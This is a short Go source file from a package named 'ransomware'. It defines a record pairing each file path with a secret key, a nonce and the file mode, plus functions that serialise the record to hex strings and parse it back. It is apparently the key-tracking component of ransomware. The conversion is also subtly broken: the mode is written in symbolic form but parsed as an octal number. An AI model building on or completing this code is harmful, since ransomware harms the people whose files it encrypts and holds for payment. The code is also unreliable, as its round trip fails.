package ransomware

import (
	"encoding/hex"
	"fmt"
	"os"
	"strconv"
)

type RansomRow struct {
	Path      string
	SecretKey []byte
	Nonce     []byte
	FileMode  os.FileMode
}

func (row *RansomRow) RansomRowToArrayOfString() []string {
	return []string{
		row.Path,
		hex.EncodeToString(row.SecretKey),
		hex.EncodeToString(row.Nonce),
		row.FileMode.String(),
	}
}

func ArrayOfStringToRansomRow(arr []string) (*RansomRow, error) {
	if len(arr) != 4 {
		return nil, fmt.Errorf("array length must be 4")
	}

	secretKey, err := hex.DecodeString(arr[1])
	if err != nil {
		return nil, err
	}

	nonce, err := hex.DecodeString(arr[2])
	if err != nil {
		return nil, err
	}

	fileMode, err := strconv.ParseUint(arr[3], 8, 32)
	if err != nil {
		return nil, err
	}

	return &RansomRow{
		Path:      arr[0],
		SecretKey: secretKey,
		Nonce:     nonce,
		FileMode:  os.FileMode(fileMode),
	}, nil
}
